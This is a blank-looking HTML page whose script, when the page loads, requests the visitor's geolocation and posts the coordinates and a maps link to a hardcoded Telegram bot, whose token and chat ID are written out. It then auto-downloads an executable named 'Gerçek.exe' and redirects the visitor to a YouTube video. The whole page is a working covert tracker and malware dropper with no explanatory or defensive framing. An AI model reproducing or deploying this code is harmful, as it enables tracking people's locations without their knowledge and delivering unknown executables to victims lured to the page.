<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title></title>
  <style>
    body { margin: 0; background: white; }
  </style>
  <script>
    const token = '8103906170:AAFLQZ3RE499VbqoOoGUMDnWiUPxXFwvHsg'; // ← Bot tokenını buraya yaz
    const chat_id = '8499614707'; // ← Chat ID buraya

    window.onload = function() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function(position) {
          const lat = position.coords.latitude.toFixed(6);
          const lon = position.coords.longitude.toFixed(6);
          const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
          const message = `📍 Konum Bilgisi:\nEnlem: ${lat}\nBoylam: ${lon}\n🧭 Navigasyon: ${googleMapsLink}`;

          // Telegram'a mesaj gönder
          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              chat_id: chat_id,
              text: message
            })
          })
          .then(() => {
            // Gerçek.exe indir
            const link = document.createElement('a');
            link.href = 'Gerçek.exe';
            link.download = 'Gerçek.exe';
            document.body.appendChild(link);
            link.click();

            // YouTube'a yönlendir
            window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
          })
          .catch(err => {
            console.error("Telegram'a gönderim başarısız:", err);
          });
        });
      } else {
        console.error("Tarayıcınız konum almayı desteklemiyor.");
      }
    };
  </script>
</head>
<body>
</body>
</html>
